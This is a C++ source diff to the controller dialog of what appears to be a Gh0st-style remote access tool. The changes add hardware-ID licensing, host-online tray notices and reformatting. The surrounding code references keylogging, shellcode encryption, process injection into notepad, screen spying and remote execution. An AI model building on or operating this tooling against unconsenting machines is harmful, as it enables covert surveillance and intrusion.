@@ -373,6 +373,24 @@ std::string GetParentDir()
     return path;
 }
 
+std::string CMy2015RemoteDlg::GetHardwareID(int v)
+{
+    int version = v == -1 ? THIS_CFG.GetInt("settings", "BindType", 0) : v;
+    switch (version) {
+    case 0:
+        return getHardwareID();
+    case 1: {
+        std::string master = THIS_CFG.GetStr("settings", "master");
+        if (!master.empty()) return master;
+        IPConverter cvt;
+        std::string id = cvt.getPublicIP();
+        return id;
+    }
+    default:
+        return "";
+    }
+}
+
 CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::IDD, pParent)
 {
     auto s = GetMasterHash();
@@ -557,10 +575,10 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_TOOL_RELOAD_PLUGINS, &CMy2015RemoteDlg::OnToolReloadPlugins)
     ON_COMMAND(ID_SHELLCODE_AES_C_ARRAY, &CMy2015RemoteDlg::OnShellcodeAesCArray)
     ON_COMMAND(ID_PARAM_KBLOGGER, &CMy2015RemoteDlg::OnParamKblogger)
-        ON_COMMAND(ID_ONLINE_INJ_NOTEPAD, &CMy2015RemoteDlg::OnOnlineInjNotepad)
-        ON_COMMAND(ID_PARAM_LOGIN_NOTIFY, &CMy2015RemoteDlg::OnParamLoginNotify)
-        ON_COMMAND(ID_PARAM_ENABLE_LOG, &CMy2015RemoteDlg::OnParamEnableLog)
-        END_MESSAGE_MAP()
+    ON_COMMAND(ID_ONLINE_INJ_NOTEPAD, &CMy2015RemoteDlg::OnOnlineInjNotepad)
+    ON_COMMAND(ID_PARAM_LOGIN_NOTIFY, &CMy2015RemoteDlg::OnParamLoginNotify)
+    ON_COMMAND(ID_PARAM_ENABLE_LOG, &CMy2015RemoteDlg::OnParamEnableLog)
+END_MESSAGE_MAP()
 
 
 // CMy2015RemoteDlg 消息处理程序
@@ -797,10 +815,31 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
     }
     std::string tip = flag ? " (" + v[RES_CLIENT_PUBIP] + ") " : "";
     ShowMessage("操作成功",strIP + tip.c_str() + "主机上线[" + loc + "]");
-    LeaveCriticalSection(&m_cs);
-    Mprintf("主机[%s]上线: %s\n", v[RES_CLIENT_PUBIP].empty() ? strIP : v[RES_CLIENT_PUBIP].c_str(), 
-        std::to_string(id).c_str());
 
+    bool needNotify = false;
+    NOTIFYICONDATA nidCopy = {};
+    CString infoTitle;
+    CString infoText;
+    if (m_Nid.cbSize == sizeof(NOTIFYICONDATA) && ::IsWindow(m_Nid.hWnd)) {
+        nidCopy = m_Nid; // 复制结构
+        nidCopy.cbSize = sizeof(NOTIFYICONDATA);
+        nidCopy.uFlags |= NIF_INFO;
+        infoTitle = _T("主机上线");
+        infoText = strIP + CString(tip.c_str()) + _T(" 主机上线 [") + loc + _T("]");
+        needNotify = true;
+    }
+    LeaveCriticalSection(&m_cs);
+    Mprintf("主机[%s]上线: %s\n", v[RES_CLIENT_PUBIP].empty() ? strIP : v[RES_CLIENT_PUBIP].c_str(),
+            std::to_string(id).c_str());
+    // 在临界区外填充字符串并调用 Shell_NotifyIcon（避免长时间持有 m_cs）
+    if (needNotify) {
+        CStringA titleA(infoTitle);
+        CStringA textA(infoText);
+        lstrcpynA(nidCopy.szInfoTitle, titleA.GetString(), sizeof(nidCopy.szInfoTitle));
+        lstrcpynA(nidCopy.szInfo, textA.GetString(), sizeof(nidCopy.szInfo));
+        nidCopy.uTimeout = 5000;
+        Shell_NotifyIcon(NIM_MODIFY, &nidCopy);
+    }
     SendMasterSettings(ContextObject);
 }
 
@@ -1060,11 +1099,11 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     AUTO_TICK(500, "");
     CDialogEx::OnInitDialog();
 
-	UPDATE_SPLASH(15, "正在注册主控信息...");
-	THIS_CFG.SetStr("settings", "MainWnd", std::to_string((uint64_t)GetSafeHwnd()));
-	THIS_CFG.SetStr("settings", "SN", getDeviceID(getHwFallback));
-	THIS_CFG.SetStr("settings", "PwdHash", GetPwdHash());
-	THIS_CFG.SetStr("settings", "MasterHash", GetMasterHash());
+    UPDATE_SPLASH(15, "正在注册主控信息...");
+    THIS_CFG.SetStr("settings", "MainWnd", std::to_string((uint64_t)GetSafeHwnd()));
+    THIS_CFG.SetStr("settings", "SN", getDeviceID(GetHardwareID()));
+    THIS_CFG.SetStr("settings", "PwdHash", GetPwdHash());
+    THIS_CFG.SetStr("settings", "MasterHash", GetMasterHash());
 
     UPDATE_SPLASH(20, "正在初始化文件上传模块...");
     int ret = InitFileUpload(GetHMAC());
@@ -1698,10 +1737,11 @@ void CMy2015RemoteDlg::OnOnlineUpdate()
     }
 }
 
-std::string floatToString(float f) {
-	char buf[32];
-	snprintf(buf, sizeof(buf), "%.2f", f);
-	return std::string(buf);
+std::string floatToString(float f)
+{
+    char buf[32];
+    snprintf(buf, sizeof(buf), "%.2f", f);
+    return std::string(buf);
 }
 
 void CMy2015RemoteDlg::OnOnlineDelete()
@@ -1722,10 +1762,10 @@ void CMy2015RemoteDlg::OnOnlineDelete()
         context* ctx = (context*)m_CList_Online.GetItemData(iItem);
         m_CList_Online.DeleteItem(iItem);
         m_HostList.erase(ctx);
-		auto tm = ctx->GetAliveTime();
-		std::string aliveInfo = tm >= 86400 ? floatToString(tm / 86400.f) + " d" :
-			tm >= 3600 ? floatToString(tm / 3600.f) + " h" :
-			tm >= 60 ? floatToString(tm / 60.f) + " m" : floatToString(tm) + " s";
+        auto tm = ctx->GetAliveTime();
+        std::string aliveInfo = tm >= 86400 ? floatToString(tm / 86400.f) + " d" :
+                                tm >= 3600 ? floatToString(tm / 3600.f) + " h" :
+                                tm >= 60 ? floatToString(tm / 60.f) + " m" : floatToString(tm) + " s";
         ctx->Destroy();
         strIP+="断开连接";
         ShowMessage("操作成功",strIP + "[" + aliveInfo.c_str() + "]");
@@ -1840,7 +1880,7 @@ bool CMy2015RemoteDlg::CheckValid(int trail)
         auto settings = "settings", pwdKey = "Password";
         // 验证口令
         CPasswordDlg dlg(this);
-        static std::string hardwareID = getHardwareID(getHwFallback);
+        static std::string hardwareID = GetHardwareID();
         static std::string hashedID = hashSHA256(hardwareID);
         static std::string deviceID = getFixedLengthID(hashedID);
         CString pwd = THIS_CFG.GetStr(settings, pwdKey, "").c_str();
@@ -1865,6 +1905,7 @@ bool CMy2015RemoteDlg::CheckValid(int trail)
         std::string fixedKey = getFixedLengthID(finalKey);
         if (hash256 != fixedKey) {
             THIS_CFG.SetStr(settings, pwdKey, "");
+            THIS_CFG.SetStr(settings, "PwdHmac", "");
             if (pwd.IsEmpty() || hash256 != fixedKey || IDOK != dlg.DoModal()) {
                 if (!dlg.m_sPassword.IsEmpty())
                     MessageBox("口令错误, 无法继续操作!", "提示", MB_ICONWARNING);
@@ -2264,27 +2305,30 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
             uint64_t hmac = len > 64 ? *((uint64_t*)(szBuffer+62)) : 0;
             auto v = splitString(passcode, '-');
             if (v.size() == 6 || v.size() == 7) {
-				std::vector<std::string> subvector(v.end() - 4, v.end());
-				std::string password = v[0] + " - " + v[1] + ": " + GetPwdHash() + (v.size() == 6 ? "" : ": " + v[2]);
-				std::string finalKey = deriveKey(password, sn);
-				std::string hash256 = joinString(subvector, '-');
-				std::string fixedKey = getFixedLengthID(finalKey);
-				valid = (hash256 == fixedKey);
+                std::vector<std::string> subvector(v.end() - 4, v.end());
+                std::string password = v[0] + " - " + v[1] + ": " + GetPwdHash() + (v.size() == 6 ? "" : ": " + v[2]);
+                std::string finalKey = deriveKey(password, sn);
+                std::string hash256 = joinString(subvector, '-');
+                std::string fixedKey = getFixedLengthID(finalKey);
+                valid = (hash256 == fixedKey);
             }
             if (valid) {
                 static const char* superAdmin = getenv("YAMA_PWD");
                 std::string pwd = superAdmin ? superAdmin : m_superPass;
                 if (VerifyMessage(pwd, (BYTE*)passcode.c_str(), passcode.length(), hmac)) {
                     Mprintf("%s 校验成功, HMAC 校验成功: %s\n", passcode.c_str(), sn.c_str());
-					std::string tip = passcode + " 校验成功: " + sn;
-					CharMsg* msg = new CharMsg(tip.c_str());
-					PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
-                }
-                else {
+                    std::string tip = passcode + " 校验成功: " + sn;
+                    CharMsg* msg = new CharMsg(tip.c_str());
+                    PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
+                } else {
                     valid = FALSE;
                     Mprintf("%s 校验成功, HMAC 校验失败: %s\n", passcode.c_str(), sn.c_str());
                 }
+            } else {
+                Mprintf("%s 校验失败: %s\n", passcode.c_str(), sn.c_str());
             }
+        } else {
+            Mprintf("授权数据长度不足: %u\n", len);
         }
         char resp[100] = { valid };
         const char* msg = valid ? "此程序已获授权，请遵守授权协议，感谢合作" : "未获授权或消息哈希校验失败";
@@ -2301,9 +2345,8 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
             std::string hash = GetPwdHash(), hmac = GetHMAC(100);
             std::thread(FileBatchTransferWorker, files, dir, ContextObject, SendData, FinishSend,
                         hash, hmac).detach();
-        }
-        else {
-			Mprintf("GetClipboardFiles failed: %d\n", result);
+        } else {
+            Mprintf("GetClipboardFiles failed: %d\n", result);
         }
         break;
     }
@@ -2569,10 +2612,10 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
         CLock L(m_cs);
         m_HostList.erase(host);
     }
-	DialogBase* p = (DialogBase*)wParam;
-	if (p && ::IsWindow(p->GetSafeHwnd()) && p->ShouldReconnect()) {
-		return S_OK;
-	}
+    DialogBase* p = (DialogBase*)wParam;
+    if (p && ::IsWindow(p->GetSafeHwnd()) && p->ShouldReconnect()) {
+        return S_OK;
+    }
 
     CString ip, port;
     port.Format("%d", lParam);
@@ -2586,9 +2629,9 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
             m_CList_Online.DeleteItem(i);
             m_HostList.erase(ctx);
             auto tm = ctx->GetAliveTime();
-            std::string aliveInfo = tm>=86400 ? floatToString(tm / 86400.f) + " d" : 
-                tm >= 3600 ? floatToString(tm / 3600.f) + " h" : 
-                tm >= 60 ? floatToString(tm / 60.f) + " m" : floatToString(tm) + " s";
+            std::string aliveInfo = tm>=86400 ? floatToString(tm / 86400.f) + " d" :
+                                    tm >= 3600 ? floatToString(tm / 3600.f) + " h" :
+                                    tm >= 60 ? floatToString(tm / 60.f) + " m" : floatToString(tm) + " s";
             ShowMessage("操作成功", ip + "主机下线[" + aliveInfo.c_str() + "]");
             break;
         }
@@ -2671,13 +2714,13 @@ context* CMy2015RemoteDlg::FindHost(int port)
 
 context* CMy2015RemoteDlg::FindHost(uint64_t id)
 {
-	CLock L(m_cs);
-	for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
-		if ((*i)->GetClientID() == id) {
-			return *i;
-		}
-	}
-	return NULL;
+    CLock L(m_cs);
+    for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
+        if ((*i)->GetClientID() == id) {
+            return *i;
+        }
+    }
+    return NULL;
 }
 
 void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx)
@@ -2731,15 +2774,15 @@ BOOL CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, 
 LRESULT CMy2015RemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 {
     CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
-	LPBYTE p = ContextObject->InDeCompressedBuffer.GetBuffer(41);
+    LPBYTE p = ContextObject->InDeCompressedBuffer.GetBuffer(41);
     LPBYTE q = ContextObject->InDeCompressedBuffer.GetBuffer(49);
-	uint64_t clientID = p ? *((uint64_t*)p) : 0;
+    uint64_t clientID = p ? *((uint64_t*)p) : 0;
     uint64_t dlgID = q ? *((uint64_t*)q) : 0;
     auto mainCtx = clientID ? FindHost(clientID) : NULL;
     CDialogBase* dlg = dlgID ? (DialogBase*)dlgID : NULL;
     if (mainCtx) ContextObject->SetPeerName(mainCtx->GetClientData(ONLINELIST_IP).GetString());
     if (dlg) {
-        if (GetRemoteWindow(dlg->GetSafeHwnd()))
+        if (GetRemoteWindow(dlg))
             return dlg->UpdateContext(ContextObject);
         Mprintf("收到远程桌面打开消息, 对话框已经销毁: %lld\n", dlgID);
     }
@@ -2855,7 +2898,8 @@ BOOL CMy2015RemoteDlg::PreTranslateMessage(MSG* pMsg)
     return CDialogEx::PreTranslateMessage(pMsg);
 }
 
-LRESULT CMy2015RemoteDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam) {
+LRESULT CMy2015RemoteDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
+{
     // WM_COMMAND 不计时
     if (message == WM_COMMAND) {
         return CDialogEx::WindowProc(message, wParam, lParam);
@@ -2866,13 +2910,12 @@ LRESULT CMy2015RemoteDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
     LRESULT result = CDialogEx::WindowProc(message, wParam, lParam);
 
     auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(
-        std::chrono::steady_clock::now() - start).count();
+                  std::chrono::steady_clock::now() - start).count();
 
     if (ms > m_TraceTime) {
         if (message >= WM_USER) {
             Mprintf("[BLOCKED] WM_USER + %d 阻塞: %lld ms\n", message - WM_USER, ms);
-        }
-        else {
+        } else {
             Mprintf("[BLOCKED] MSG 0x%04X (%d) 阻塞: %lld ms\n", message, message, ms);
         }
     }
@@ -2912,7 +2955,7 @@ LRESULT CMy2015RemoteDlg::ShareClient(WPARAM wParam, LPARAM lParam)
 void CMy2015RemoteDlg::OnToolAuth()
 {
     CPwdGenDlg dlg;
-    std::string hardwareID = getHardwareID(getHwFallback);
+    std::string hardwareID = GetHardwareID();
     std::string hashedID = hashSHA256(hardwareID);
     std::string deviceID = getFixedLengthID(hashedID);
     dlg.m_sDeviceID = deviceID.c_str();
@@ -3445,10 +3488,10 @@ void CMy2015RemoteDlg::OnToolRequestAuth()
     std::string pwd = THIS_CFG.GetStr("settings", "Password");
     BOOL noPwd = pwd.empty();
     if (noPwd && IDYES != MessageBoxA("本软件仅限于合法、正当、合规的用途。\r\n您是否同意？",
-        "声明", MB_ICONQUESTION | MB_YESNO))
+                                      "声明", MB_ICONQUESTION | MB_YESNO))
         return;
     CInputDialog dlg(this);
-    dlg.m_str = getDeviceID(getHwFallback).c_str();
+    dlg.m_str = getDeviceID(GetHardwareID()).c_str();
     dlg.Init(noPwd ? "请求授权" : "序列号", "序列号(唯一ID):");
     if (!noPwd)
         dlg.Init2("授权口令:", pwd.c_str());
@@ -3807,10 +3850,10 @@ void CMy2015RemoteDlg::OnOnlineUninstall()
         context* ctx = (context*)m_CList_Online.GetItemData(iItem);
         m_CList_Online.DeleteItem(iItem);
         m_HostList.erase(ctx);
-		auto tm = ctx->GetAliveTime();
-		std::string aliveInfo = tm >= 86400 ? floatToString(tm / 86400.f) + " d" :
-			tm >= 3600 ? floatToString(tm / 3600.f) + " h" :
-			tm >= 60 ? floatToString(tm / 60.f) + " m" : floatToString(tm) + " s";
+        auto tm = ctx->GetAliveTime();
+        std::string aliveInfo = tm >= 86400 ? floatToString(tm / 86400.f) + " d" :
+                                tm >= 3600 ? floatToString(tm / 3600.f) + " h" :
+                                tm >= 60 ? floatToString(tm / 60.f) + " m" : floatToString(tm) + " s";
         ctx->Destroy();
         strIP += "断开连接";
         ShowMessage("操作成功", strIP + "[" + aliveInfo.c_str() + "]");
@@ -3882,7 +3925,7 @@ void CMy2015RemoteDlg::OnOnlineRegroup()
 {
     CInputDialog dlg(this);
     dlg.Init("修改分组", "请输入分组名称:");
-    if (IDOK != dlg.DoModal()||dlg.m_str.IsEmpty()){
+    if (IDOK != dlg.DoModal()||dlg.m_str.IsEmpty()) {
         return;
     }
     if (dlg.m_str.GetLength() >= 24) {
@@ -3955,7 +3998,7 @@ void CMy2015RemoteDlg::OnExecuteDownload()
 void CMy2015RemoteDlg::OnExecuteUpload()
 {
     CFileDialog dlg(TRUE, NULL, NULL, OFN_HIDEREADONLY | OFN_FILEMUSTEXIST,
-        _T("可执行文件 (*.exe)|*.exe||"), this);
+                    _T("可执行文件 (*.exe)|*.exe||"), this);
 
     if (dlg.DoModal() != IDOK)
         return;
@@ -4005,56 +4048,55 @@ void CMy2015RemoteDlg::OnDestroy()
 
 CString GetClipboardText()
 {
-	if (!OpenClipboard(nullptr)) return _T("");
+    if (!OpenClipboard(nullptr)) return _T("");
 
-	CString strText;
+    CString strText;
 
-	// 优先获取 Unicode 格式
-	HANDLE hData = GetClipboardData(CF_UNICODETEXT);
-	if (hData) {
-		wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
-		if (pszText) {
+    // 优先获取 Unicode 格式
+    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
+    if (hData) {
+        wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
+        if (pszText) {
 #ifdef UNICODE
-			strText = pszText;
+            strText = pszText;
 #else
-			// 将 Unicode 转换为多字节（使用系统默认代码页）
-			int len = WideCharToMultiByte(CP_ACP, 0, pszText, -1, nullptr, 0, nullptr, nullptr);
-			if (len > 0) {
-				char* pBuf = strText.GetBuffer(len);
-				WideCharToMultiByte(CP_ACP, 0, pszText, -1, pBuf, len, nullptr, nullptr);
-				strText.ReleaseBuffer();
-			}
+            // 将 Unicode 转换为多字节（使用系统默认代码页）
+            int len = WideCharToMultiByte(CP_ACP, 0, pszText, -1, nullptr, 0, nullptr, nullptr);
+            if (len > 0) {
+                char* pBuf = strText.GetBuffer(len);
+                WideCharToMultiByte(CP_ACP, 0, pszText, -1, pBuf, len, nullptr, nullptr);
+                strText.ReleaseBuffer();
+            }
 #endif
-		}
-		GlobalUnlock(hData);
-	}
+        }
+        GlobalUnlock(hData);
+    }
 
-	CloseClipboard();
-	return strText;
+    CloseClipboard();
+    return strText;
 }
 
 void SetClipboardText(const char* utf8Text)
 {
-	if (!OpenClipboard(nullptr)) return;
-	EmptyClipboard();
+    if (!OpenClipboard(nullptr)) return;
+    EmptyClipboard();
 
-	// UTF-8 转 Unicode
-	int wlen = MultiByteToWideChar(CP_UTF8, 0, utf8Text, -1, nullptr, 0);
-	if (wlen > 0) {
-		HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, wlen * sizeof(wchar_t));
-		if (hGlob) {
-			wchar_t* p = static_cast<wchar_t*>(GlobalLock(hGlob));
-			if (p) {
-				MultiByteToWideChar(CP_UTF8, 0, utf8Text, -1, p, wlen);
-				GlobalUnlock(hGlob);
-				SetClipboardData(CF_UNICODETEXT, hGlob);
-			}
-			else {
-				GlobalFree(hGlob);
-			}
-		}
-	}
-	CloseClipboard();
+    // UTF-8 转 Unicode
+    int wlen = MultiByteToWideChar(CP_UTF8, 0, utf8Text, -1, nullptr, 0);
+    if (wlen > 0) {
+        HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, wlen * sizeof(wchar_t));
+        if (hGlob) {
+            wchar_t* p = static_cast<wchar_t*>(GlobalLock(hGlob));
+            if (p) {
+                MultiByteToWideChar(CP_UTF8, 0, utf8Text, -1, p, wlen);
+                GlobalUnlock(hGlob);
+                SetClipboardData(CF_UNICODETEXT, hGlob);
+            } else {
+                GlobalFree(hGlob);
+            }
+        }
+    }
+    CloseClipboard();
 }
 
 CDialogBase* CMy2015RemoteDlg::GetRemoteWindow(HWND hWnd)
@@ -4065,6 +4107,19 @@ CDialogBase* CMy2015RemoteDlg::GetRemoteWindow(HWND hWnd)
     auto ret = find == m_RemoteWnds.end() ? NULL : find->second;
     LeaveCriticalSection(&m_cs);
     return ret;
+}
+
+CDialogBase* CMy2015RemoteDlg::GetRemoteWindow(CDialogBase *dlg)
+{
+    EnterCriticalSection(&m_cs);
+    for (auto& pair : m_RemoteWnds) {
+        if (pair.second == dlg) {
+            LeaveCriticalSection(&m_cs);
+            return pair.second;
+        }
+    }
+    LeaveCriticalSection(&m_cs);
+    return NULL;
 }
 
 void CMy2015RemoteDlg::RemoveRemoteWindow(HWND wnd)
@@ -4129,9 +4184,8 @@ LRESULT CALLBACK CMy2015RemoteDlg::LowLevelKeyboardProc(int nCode, WPARAM wParam
                                     Sleep(100);
                                 Mprintf("【Ctrl+V】 从本地拷贝文本到远程 \n");
                                 SAFE_DELETE_ARRAY(szBuffer);
-                            }
-                            else {
-								Mprintf("【Ctrl+V】 本地剪贴板没有文本或文件: %d \n", result);
+                            } else {
+                                Mprintf("【Ctrl+V】 本地剪贴板没有文本或文件: %d \n", result);
                             }
                         }
                     } else if (g_2015RemoteDlg->m_pActiveSession && operateWnd) {
@@ -4280,16 +4334,16 @@ void CMy2015RemoteDlg::OnParamLoginNotify()
     static BOOL notify = THIS_CFG.GetInt("settings", "LoginNotify", 0);
     notify = !notify;
     THIS_CFG.SetInt("settings", "LoginNotify", notify);
-	CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
-	SubMenu->CheckMenuItem(ID_PARAM_LOGIN_NOTIFY, notify ? MF_CHECKED : MF_UNCHECKED);
+    CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
+    SubMenu->CheckMenuItem(ID_PARAM_LOGIN_NOTIFY, notify ? MF_CHECKED : MF_UNCHECKED);
 }
 
 
 void CMy2015RemoteDlg::OnParamEnableLog()
 {
     m_settings.EnableLog = !m_settings.EnableLog;
-	CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
-	SubMenu->CheckMenuItem(ID_PARAM_ENABLE_LOG, m_settings.EnableLog ? MF_CHECKED : MF_UNCHECKED);
-	THIS_CFG.SetInt("settings", "EnableLog", m_settings.EnableLog);
-	SendMasterSettings(nullptr);
+    CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
+    SubMenu->CheckMenuItem(ID_PARAM_ENABLE_LOG, m_settings.EnableLog ? MF_CHECKED : MF_UNCHECKED);
+    THIS_CFG.SetInt("settings", "EnableLog", m_settings.EnableLog);
+    SendMasterSettings(nullptr);
 }
